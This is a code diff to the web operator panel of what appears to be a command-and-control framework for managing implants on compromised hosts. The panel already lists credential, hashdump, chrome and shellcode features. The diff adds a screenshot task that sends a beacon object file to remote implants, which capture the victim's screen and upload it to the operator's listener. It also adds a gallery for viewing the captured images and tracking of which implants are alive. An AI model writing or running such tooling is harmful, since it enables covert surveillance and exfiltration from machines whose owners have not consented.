@@ -348,6 +348,10 @@ tr.clickable {
 .status.alive { background: var(--success); }
 .status.dead { background: var(--error); }
 .status.pending { background: var(--warning); }
+
+tr.dead-row td {
+  opacity: 0.5;
+}
 .status.complete { background: var(--success); }
 .status.error { background: var(--error); }
 .status.running { background: var(--warning); animation: pulse 1s infinite; }
@@ -841,6 +845,86 @@ tr.clickable {
   line-height: 1.4;
 }
 
+/* screenshots page */
+.screenshot-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+  gap: 16px;
+}
+
+.screenshot-card {
+  background: var(--bg-secondary);
+  border: 1px solid var(--border);
+  overflow: hidden;
+  cursor: pointer;
+  transition: border-color 0.2s;
+}
+
+.screenshot-card:hover {
+  border-color: var(--text-dim);
+}
+
+.screenshot-img {
+  width: 100%;
+  height: 200px;
+  object-fit: cover;
+  display: block;
+  background: var(--bg);
+}
+
+.screenshot-info {
+  padding: 12px;
+  border-top: 1px solid var(--border);
+}
+
+.screenshot-name {
+  font-size: 12px;
+  color: var(--text);
+  margin-bottom: 4px;
+  word-break: break-all;
+}
+
+.screenshot-meta {
+  font-size: 10px;
+  color: var(--text-dim);
+}
+
+/* screenshot modal */
+.screenshot-modal {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0,0,0,0.9);
+  z-index: 300;
+  align-items: center;
+  justify-content: center;
+  padding: 40px;
+}
+
+.screenshot-modal.open {
+  display: flex;
+}
+
+.screenshot-modal img {
+  max-width: 100%;
+  max-height: 100%;
+  object-fit: contain;
+}
+
+.screenshot-modal-close {
+  position: absolute;
+  top: 20px;
+  right: 20px;
+  background: none;
+  border: none;
+  color: var(--text);
+  font-size: 32px;
+  cursor: pointer;
+}
+
 /* toast notifications */
 .toast-container {
   position: fixed;
@@ -923,6 +1007,7 @@ tr.clickable {
       <div class="nav-section">data</div>
       <div class="nav-item" data-page="results">results</div>
       <div class="nav-item" data-page="credentials">credentials</div>
+      <div class="nav-item" data-page="screenshots">screenshots</div>
     </nav>
 
     <div class="content">
@@ -1017,6 +1102,12 @@ tr.clickable {
             <tbody id="credentialsTable"></tbody>
           </table>
         </div>
+      </div>
+
+      <!-- screenshots page -->
+      <div class="page" id="page-screenshots">
+        <h1 class="page-title">screenshots</h1>
+        <div class="screenshot-grid" id="screenshotGrid"></div>
       </div>
 
       <!-- bofs page -->
@@ -1120,6 +1211,7 @@ tr.clickable {
             <option value="env">env</option>
             <option value="hashdump">hashdump</option>
             <option value="chrome">chrome</option>
+            <option value="screenshot">screenshot</option>
             <option value="unhook">unhook</option>
             <option value="bof">bof</option>
           </select>
@@ -1163,6 +1255,12 @@ tr.clickable {
       <button class="command-btn" onclick="createListener()">create</button>
     </div>
   </div>
+</div>
+
+<!-- screenshot viewer modal -->
+<div class="screenshot-modal" id="screenshotModal" onclick="closeScreenshotModal()">
+  <button class="screenshot-modal-close" onclick="closeScreenshotModal()">&times;</button>
+  <img id="screenshotModalImg" src="" alt="screenshot">
 </div>
 
 <script>
@@ -1251,6 +1349,7 @@ async function loadData() {
     loadCredentials(),
     loadAllResults(),
     loadBOFs(),
+    loadScreenshots(),
     updateShellcodeImplantSelect()
   ]);
   
@@ -1280,10 +1379,20 @@ async function apiDelete(endpoint) {
   return await res.json();
 }
 
-// implants
+const DEAD_THRESHOLD_MS = 120000;
+
+function isImplantAlive(implant) {
+  if (!implant.last_seen) return false;
+  const lastSeen = new Date(implant.last_seen).getTime();
+  const now = Date.now();
+  return (now - lastSeen) < DEAD_THRESHOLD_MS;
+}
+
 async function loadImplants() {
   const implants = await api('/implants') || [];
-  document.getElementById('implantCount').textContent = implants.length;
+  implants.forEach(i => { i.alive = isImplantAlive(i); });
+  const aliveCount = implants.filter(i => i.alive).length;
+  document.getElementById('implantCount').textContent = aliveCount;
   
   const tbody = document.getElementById('implantsTable');
   if (implants.length === 0) {
@@ -1292,7 +1401,7 @@ async function loadImplants() {
   }
   
   tbody.innerHTML = implants.map(i => ` + "`" + `
-    <tr class="clickable" onclick="selectImplant('${i.id}')">
+    <tr class="clickable ${i.alive ? '' : 'dead-row'}" onclick="selectImplant('${i.id}')">
       <td><span class="status ${i.alive ? 'alive' : 'dead'}"></span>${i.alive ? 'alive' : 'dead'}</td>
       <td class="truncate">${i.id.substring(0,8)}</td>
       <td>${i.elevated ? '<span class="elevated">*</span>' : ''}${i.username}</td>
@@ -1367,6 +1476,12 @@ async function sendCommand() {
   const type = document.getElementById('commandType').value;
   const args = document.getElementById('commandArgs').value.trim();
   
+  // Handle screenshot specially - execute BOF with server URL
+  if (type === 'screenshot') {
+    await executeScreenshot();
+    return;
+  }
+  
   await apiPost('/implants/' + currentImplant.id + '/tasks', {
     type: type,
     args: args ? [args] : []
@@ -1376,7 +1491,40 @@ async function sendCommand() {
   setTimeout(() => loadImplantTasks(currentImplant.id), 500);
 }
 
-// listeners
+async function executeScreenshot() {
+  if (!currentImplant) return;
+  
+  const bofData = await api('/bofs/screenshot.x64.o');
+  if (!bofData || !bofData.data) {
+    toast('Screenshot BOF not found (screenshot.x64.o)', 'error');
+    return;
+  }
+  
+  const argsStr = document.getElementById('commandArgs').value.trim();
+  if (!argsStr) {
+    toast('No args - select screenshot to auto-fill', 'error');
+    return;
+  }
+  
+  const bofArgs = argsStr.split(/\s+/);
+  const taskArgs = ['{}', ...bofArgs];
+  
+  await fetch('/api/implants/' + currentImplant.id + '/tasks', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      type: 'bof',
+      args: taskArgs,
+      data: bofData.data
+    })
+  });
+  
+  document.getElementById('commandArgs').value = '';
+  toast('Screenshot task queued', 'success');
+  setTimeout(() => loadImplantTasks(currentImplant.id), 500);
+}
+
+
 async function loadListeners() {
   const listeners = await api('/listeners') || [];
   document.getElementById('listenerCount').textContent = listeners.length;
@@ -1457,6 +1605,36 @@ async function loadCredentials() {
       <td>${c.type}</td>
     </tr>
   ` + "`" + `).join('');
+}
+
+// screenshots
+async function loadScreenshots() {
+  const screenshots = await api('/screenshots') || [];
+  const grid = document.getElementById('screenshotGrid');
+  
+  if (screenshots.length === 0) {
+    grid.innerHTML = '<div class="empty-state"><div class="empty-state-icon">○</div>no screenshots yet</div>';
+    return;
+  }
+  
+  grid.innerHTML = screenshots.map(s => ` + "`" + `
+    <div class="screenshot-card" onclick="viewScreenshot('${s.id}')">
+      <img class="screenshot-img" src="/api/screenshots/${s.id}" alt="${s.name}" loading="lazy">
+      <div class="screenshot-info">
+        <div class="screenshot-name">${s.name}</div>
+        <div class="screenshot-meta">${formatTime(s.created)}</div>
+      </div>
+    </div>
+  ` + "`" + `).join('');
+}
+
+function viewScreenshot(id) {
+  document.getElementById('screenshotModalImg').src = '/api/screenshots/' + id;
+  document.getElementById('screenshotModal').classList.add('open');
+}
+
+function closeScreenshotModal() {
+  document.getElementById('screenshotModal').classList.remove('open');
 }
 
 // results
@@ -1569,22 +1747,52 @@ function filterBOFs() {
   renderBOFs(filtered);
 }
 
-function selectBOF(name) {
+async function selectBOF(name) {
   selectedBOF = name;
   document.getElementById('selectedBof').value = name;
   renderBOFs(allBOFs.filter(b => {
     const search = document.getElementById('bofSearch').value.toLowerCase();
     return b.name.toLowerCase().includes(search);
   }));
+  
+  // Auto-fill args for screenshot BOF
+  const argsInput = document.getElementById('bofArgs');
+  if (name.toLowerCase().includes('screenshot')) {
+    const listeners = await api('/listeners') || [];
+    const activeListener = listeners.find(l => l.active);
+    if (activeListener) {
+      let serverHost = activeListener.host;
+      if (serverHost === '0.0.0.0' || serverHost === '127.0.0.1') {
+        serverHost = window.location.hostname;
+      }
+      argsInput.value = 'z' + serverHost + ':' + activeListener.port + ' i0 i0 i70 i100';
+      argsInput.placeholder = 'zurl:port iPid iGrayscale iQuality iScale';
+    } else {
+      argsInput.placeholder = 'start a listener first for screenshot';
+    }
+  } else {
+    argsInput.value = '';
+    argsInput.placeholder = 'arg1 arg2 ... (prefix: z=str i=int s=short b=hex)';
+  }
 }
 
 async function updateBofImplantSelect() {
   const implants = await api('/implants') || [];
   const select = document.getElementById('bofTargetImplant');
+  const currentValue = select.value; // Preserve current selection
+  
+  // Update alive status
+  implants.forEach(i => { i.alive = isImplantAlive(i); });
+  
   select.innerHTML = '<option value="">select implant...</option>' + 
     implants.filter(i => i.alive).map(i => 
       ` + "`" + `<option value="${i.id}">${i.hostname} (${i.username})</option>` + "`" + `
     ).join('');
+  
+  // Restore selection if still valid
+  if (currentValue && select.querySelector(` + "`" + `option[value="${currentValue}"]` + "`" + `)) {
+    select.value = currentValue;
+  }
 }
 
 async function executeBOF() {
@@ -1605,8 +1813,11 @@ async function executeBOF() {
     return;
   }
   
-  const args = document.getElementById('bofArgs').value.trim();
-  const taskArgs = args ? [args] : [];
+  const argsStr = document.getElementById('bofArgs').value.trim();
+  // First arg is JSON metadata (empty for inline BOF), rest are BOF args
+  // Split space-separated args and prepend empty JSON object
+  const bofArgs = argsStr ? argsStr.split(/\s+/) : [];
+  const taskArgs = ['{}', ...bofArgs]; // Empty JSON metadata + BOF args
   
   await fetch('/api/implants/' + implantId + '/tasks', {
     method: 'POST',
@@ -1634,10 +1845,20 @@ let shellcodeBytes = null;
 async function updateShellcodeImplantSelect() {
   const implants = await api('/implants') || [];
   const select = document.getElementById('shellcodeTargetImplant');
+  const currentValue = select.value; // Preserve current selection
+  
+  // Update alive status
+  implants.forEach(i => { i.alive = isImplantAlive(i); });
+  
   select.innerHTML = '<option value="">select implant...</option>' + 
     implants.filter(i => i.alive).map(i => 
       ` + "`" + `<option value="${i.id}">${i.hostname} (${i.username})</option>` + "`" + `
     ).join('');
+  
+  // Restore selection if still valid
+  if (currentValue && select.querySelector(` + "`" + `option[value="${currentValue}"]` + "`" + `)) {
+    select.value = currentValue;
+  }
 }
 
 function handleShellcodeFile(event) {
@@ -1743,6 +1964,44 @@ document.getElementById('password').addEventListener('keypress', e => {
 
 document.getElementById('commandArgs').addEventListener('keypress', e => {
   if (e.key === 'Enter') sendCommand();
+});
+
+document.getElementById('commandType').addEventListener('change', async function() {
+  const argsInput = document.getElementById('commandArgs');
+  switch (this.value) {
+    case 'screenshot':
+      const listeners = await api('/listeners') || [];
+      const activeListener = listeners.find(l => l.active);
+      if (activeListener) {
+        let serverHost = activeListener.host;
+        if (serverHost === '0.0.0.0' || serverHost === '127.0.0.1') {
+          serverHost = window.location.hostname;
+        }
+        argsInput.value = 'z' + serverHost + ':' + activeListener.port + ' i0 i0 i70 i100';
+        argsInput.placeholder = 'zurl:port iPid iGrayscale iQuality iScale';
+      } else {
+        argsInput.placeholder = 'start a listener first';
+      }
+      break;
+    case 'shell':
+    case 'powershell':
+      argsInput.value = '';
+      argsInput.placeholder = 'command to execute';
+      break;
+    case 'ls':
+    case 'cd':
+    case 'cat':
+      argsInput.value = '';
+      argsInput.placeholder = 'path';
+      break;
+    case 'bof':
+      argsInput.value = '';
+      argsInput.placeholder = 'use BOFs page instead';
+      break;
+    default:
+      argsInput.value = '';
+      argsInput.placeholder = 'arguments (optional)';
+  }
 });
 
 // init
